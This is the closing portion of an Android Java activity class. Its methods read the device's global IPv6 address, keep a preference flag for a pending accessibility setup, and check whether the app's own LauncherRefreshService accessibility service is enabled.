    // Renamed from getIPv6Address to avoid confusion
    public static String getLocalIPv6Address() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr instanceof Inet6Address) {
                        String ip = addr.getHostAddress();
                        // Remove zone index if present
                        int idx = ip.indexOf('%');
                        if (idx >= 0) {
                            ip = ip.substring(0, idx);
                        }
                        // Skip link-local addresses (fe80::)
                        if (!ip.toLowerCase().startsWith("fe80")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Auto-hide disabled: app stays visible
    }

    private void saveWaitingForAccessibility(boolean waiting) {
        if (prefs != null) {
            prefs.edit().putBoolean(PREF_WAITING_FOR_ACCESSIBILITY, waiting).apply();
        }
    }

    private boolean isWaitingForAccessibility() {
        return prefs != null && prefs.getBoolean(PREF_WAITING_FOR_ACCESSIBILITY, false);
    }

    private boolean isAccessibilityEnabled() {
        try {
            int accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (accessibilityEnabled != 1) {
                return false;
            }
            String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) {
                return false;
            }
            ComponentName serviceComponent = new ComponentName(this, LauncherRefreshService.class);
            String serviceString = serviceComponent.flattenToString();
            for (String enabledService : enabledServices.split(":")) {
                if (enabledService.equalsIgnoreCase(serviceString)) {
                    return true;
                }
            }
        } catch (Settings.SettingNotFoundException e) {
            Log.w("MainActivity", "Accessibility setting not found: " + e.getMessage());
        } catch (Exception e) {
            Log.e("MainActivity", "Error checking accessibility enabled state", e);
        }
        return false;
    }
}
